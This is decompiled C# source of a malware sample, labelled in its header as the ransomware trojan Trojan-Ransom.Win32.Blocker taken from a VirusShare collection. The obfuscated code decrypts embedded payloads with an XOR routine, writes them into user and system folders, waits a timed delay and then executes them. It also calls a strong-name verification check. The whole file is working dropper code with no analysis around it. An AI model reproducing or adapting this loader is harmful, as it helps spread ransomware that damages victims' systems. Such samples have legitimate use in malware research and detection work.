// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BOMBS, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b01670ee6fa4859f
// MVID: D5D8F5B0-12EB-4325-8C3D-C60F341D062A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jjta-28a226e15e1e7b94528e46718041b3f49976b446eb3daccd652d0e5b43f948be.exe

using \u0001;
using \u0004;
using \u000F;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.MemoryManagement;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

namespace \u0004
{
  internal sealed class \u0001
  {
    private static string[] \u0001;
    private static string[] \u0002;
    private static string[] \u0003;
    private static string[] \u0004;
    [NonSerialized]
    internal static \u000F.\u0001 \u0087;

    static \u0001()
    {
      string[] strArray1;
      string[] strArray2;
      string[] strArray3;
      string[] strArray4;
      try
      {
        \u0002.\u0001(typeof (\u0004.\u0001));
        bool flag = false;
        Assembly assembly = global::\u0001.\u0001();
        \u0004.\u0001.\u0001(\u0002.\u007E\u0002((object) assembly), true, out flag);
        int length1 = flag ? 1 : 0;
        int length2;
        while (true)
        {
          if (true)
          {
            if (length1 != 0 && \u0003.\u007E\u0018((object) \u0002.\u007E\u0003((object) assembly), \u0004.\u0001.\u0087(61)))
              length1 = 2;
            else
              break;
          }
          strArray1 = new string[length1];
          strArray1[0] = \u0004.\u0001.\u0087(123);
          strArray1[1] = \u0004.\u0001.\u0087(123);
          \u0004.\u0001.\u0001 = strArray1;
          strArray2 = new string[2]
          {
            \u0004.\u0001.\u0087(136),
            \u0004.\u0001.\u0087(136)
          };
          \u0004.\u0001.\u0002 = strArray2;
          length2 = 2;
          if (length2 == 0)
            length1 = length2;
          else
            goto label_6;
        }
        throw new SecurityException(\u0004.\u0001.\u0087(86));
label_6:
        strArray3 = new string[length2];
        strArray3[0] = \u0004.\u0001.\u0087(141);
        do
        {
          strArray3[1] = \u0004.\u0001.\u0087(162);
          \u0004.\u0001.\u0003 = strArray3;
          strArray4 = new string[2]
          {
            \u0004.\u0001.\u0087(179),
            null
          };
        }
        while (false);
        strArray4[1] = \u0004.\u0001.\u0087(3019395);
        \u0004.\u0001.\u0004 = strArray4;
      }
      catch (Exception ex)
      {
        string[] strArray5 = strArray1;
        string[] strArray6 = strArray2;
        string[] strArray7 = strArray3;
        string[] strArray8 = strArray4;
        \u0003.\u0001(ex, (object) strArray5, (object) strArray6, (object) strArray7, (object) strArray8);
        throw;
      }
    }

    [STAThread]
    public static void \u0001()
    {
      int index1;
      string str1;
      int num1;
      int num2;
      int num3;
      int index2;
      byte[] numArray;
      string str2;
      int num4;
      int num5;
      try
      {
        if (!\u000E.\u0001())
          return;
label_1:
        try
        {
          MemoryManager.\u0001();
          global::\u0004.\u001A();
          if (true)
            goto label_39;
label_2:
          num1 = 2;
          num2 = \u0005.\u007E\u001D((object) \u0004.\u0001.\u0001, 0);
          index1 = 0;
          goto label_21;
label_3:
          num1 = 3;
          str1 = \u0004.\u0001.\u0001[index1];
label_4:
          do
          {
            num1 = 6;
          }
          while (false);
          int num6 = \u0006.\u001F(str1, \u0004.\u0001.\u0087(123), false);
          int num7 = 0;
label_6:
          if (num6 != num7)
            goto label_8;
label_7:
          num1 = 7;
          \u0004.\u0001.\u0001[index1] = \u0007.\u007F(Environment.SpecialFolder.ApplicationData);
          goto label_20;
label_8:
          num1 = 9;
          int num8 = \u0006.\u001F(str1, \u0004.\u0001.\u0087(3086759), false);
          int num9 = 0;
          if (num9 == 0)
          {
            if (num9 != 0)
            {
              num7 = num9;
              num6 = num8;
              goto label_6;
            }
            else if (num8 != num9)
              goto label_13;
          }
          else
            goto label_35;
label_11:
          num1 = 10;
          \u0004.\u0001.\u0001[index1] = \u0007.\u007F(Environment.SpecialFolder.Favorites);
label_12:
          if (false)
            goto label_29;
          else
            goto label_20;
label_13:
          num1 = 12;
          int num10 = \u0006.\u001F(str1, \u0004.\u0001.\u0087(3086772), false);
          int num11 = 0;
          int num12;
          int num13;
          if (num11 == 0)
          {
            if (num10 != num11)
              goto label_16;
          }
          else
          {
            num13 = num11;
            num12 = num10;
            goto label_22;
          }
label_15:
          num1 = 13;
          \u0004.\u0001.\u0001[index1] = \u0007.\u007F(Environment.SpecialFolder.Personal);
          goto label_20;
label_16:
          num1 = 15;
          if (\u0006.\u001F(str1, \u0004.\u0001.\u0087(3086789), false) != 0)
            goto label_19;
label_17:
          num1 = 16;
          \u0004.\u0001.\u0001[index1] = \u0007.\u007F(Environment.SpecialFolder.System);
label_18:
          if (false)
            goto label_11;
          else
            goto label_20;
label_19:
          num1 = 19;
          \u0004.\u0001.\u0001[index1] = \u0004.\u0001.\u0001[index1];
label_20:
          num1 = 21;
          checked { ++index1; }
label_21:
          num12 = index1;
          num13 = num2;
label_22:
          if (num12 <= num13)
            goto label_3;
label_23:
          if (true)
          {
            num1 = 22;
            num3 = \u0005.\u007E\u001D((object) \u0004.\u0001.\u0004, 0);
            index2 = 0;
            goto label_33;
          }
          else
            goto label_28;
label_25:
          num1 = 23;
          numArray = \u0004.\u0001.\u0001(\u0008.\u0080(\u0004.\u0001.\u0004[index2]), \u0004.\u0001.\u0087(3086798));
label_26:
          num1 = 24;
          str2 = \u000E.\u0081(\u0004.\u0001.\u0001[index2], \u0004.\u0001.\u0087(3086811), \u0004.\u0001.\u0003[index2]);
label_27:
          num1 = 25;
label_28:
          global::\u000F.\u0082(str2, numArray);
label_29:
          num1 = 26;
          \u0004.\u0001.\u0001(checked ((int) \u0011.\u0084(unchecked (\u0010.\u0083(\u0004.\u0001.\u0002[index2]) * 1000.0 * 60.0))));
label_30:
          num1 = 27;
          Process process = \u0012.\u0086(str2);
label_31:
          num1 = 28;
          if (true)
            checked { ++index2; }
          else
            goto label_42;
label_33:
          if (index2 <= num3)
            goto label_25;
          else
            goto label_43;
label_35:
          int num14 = num8 + num9;
          num4 = 0;
          switch (num14)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
            case 8:
            case 14:
            case 20:
            case 21:
              goto label_20;
            case 5:
            case 6:
              goto label_4;
            case 7:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_11;
            case 11:
              goto label_12;
            case 12:
              goto label_13;
            case 13:
              goto label_15;
            case 15:
              goto label_16;
            case 16:
              goto label_17;
            case 17:
              goto label_18;
            case 18:
            case 19:
              goto label_19;
            case 22:
              goto label_23;
            case 23:
              goto label_25;
            case 24:
              goto label_26;
            case 25:
              goto label_27;
            case 26:
              goto label_29;
            case 27:
              goto label_30;
            case 28:
              goto label_31;
            case 29:
              goto label_43;
            default:
              goto label_42;
          }
label_39:
          num5 = 1;
          goto label_2;
label_37:
          num4 = num1;
          switch (num5)
          {
            case 1:
              int num15 = num4;
              num9 = 1;
              num8 = num15;
              goto label_35;
          }
        }
        catch (Exception ex) when (ex is Exception & num5 != 0 & num4 == 0)
        {
          ProjectData.SetProjectError(ex);
          goto label_37;
        }
label_42:
        throw \u0014.\u0088(-2146828237);
label_43:
        if (num4 == 0)
          return;
        global::\u0004.\u001A();
      }
      catch (Exception ex)
      {
        object[] objArray = new object[10]
        {
          (object) index1,
          (object) numArray,
          (object) index2,
          (object) str2,
          (object) num2,
          (object) str1,
          (object) num3,
          (object) num5,
          (object) num4,
          (object) num1
        };
        \u0005.\u0001(ex, objArray);
      }
    }

    private static void \u0001([In] int obj0)
    {
      Stopwatch stopwatch1;
      try
      {
        stopwatch1 = new Stopwatch();
        \u0015.\u007E\u0089((object) stopwatch1);
        while (\u0016.\u007E\u0005\u0002((object) stopwatch1) < (long) obj0)
        {
          if (false)
            return;
          global::\u0004.\u001B();
        }
        \u0015.\u007E\u008A((object) stopwatch1);
      }
      catch (Exception ex)
      {
        Stopwatch stopwatch2 = stopwatch1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj0;
        \u0003.\u0001(ex, (object) stopwatch2, (object) local);
        throw;
      }
    }

    public static byte[] \u0001([In] byte[] obj0, [In] string obj1)
    {
      int num1;
      int index1;
      byte[] numArray1;
      int num2;
      byte[] numArray2;
      int index2;
      try
      {
        numArray2 = \u0018.\u007E\u0010\u0002((object) \u0017.\u0007\u0002(), obj1);
        int num3 = (int) obj0[checked (obj0.Length - 1)];
        int num4 = 112;
        int num5;
        int length;
        if (num4 != 0)
        {
          int num6 = num3 ^ num4;
          if (false)
          {
            num5 = num6;
            goto label_10;
          }
          else
          {
            num2 = num6;
            length = checked (obj0.Length + 1);
          }
        }
        else
          goto label_14;
label_3:
        numArray1 = new byte[length];
        int num7 = obj0.Length;
        int num8 = 0;
label_4:
        num1 = checked (num7 - 1);
        index1 = num8;
        goto label_13;
label_10:
        index2 = checked (num5 + 1);
label_11:
        num8 = index1;
        num7 = 1;
        if (num7 != 0)
          index1 = checked (num8 + num7);
        else
          goto label_4;
label_13:
        int num9 = index1;
        num4 = num1;
        num3 = num9;
label_14:
        int num10;
        for (; num3 <= num4; num3 = num10)
        {
          numArray1[index1] = checked ((byte) ((int) obj0[index1] ^ num2 ^ (int) numArray2[index2]));
          num10 = index2;
          int num11 = \u0019.\u007E\u0011\u0002((object) obj1);
          if (true)
          {
            int num12 = checked (num11 - 1);
            if (num10 == num12)
            {
              length = 0;
              if (length == 0)
              {
                index2 = length;
                goto label_11;
              }
              else
                goto label_3;
            }
            else
            {
              num5 = index2;
              goto label_10;
            }
          }
          else
            num4 = num11;
        }
        return (byte[]) \u001A.\u001E\u0002((Array) numArray1, (Array) new byte[checked (obj0.Length - 2 + 1)]);
      }
      catch (Exception ex)
      {
        byte[] numArray3;
        byte[] numArray4 = numArray3;
        byte[] numArray5 = numArray1;
        byte[] numArray6 = numArray2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) index2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) index1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) num1;
        byte[] numArray7 = obj0;
        string str = obj1;
        \u0003.\u0001(ex, (object) numArray4, (object) numArray5, (object) numArray6, (object) local1, (object) local2, (object) local3, (object) local4, (object) numArray7, (object) str);
        throw;
      }
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
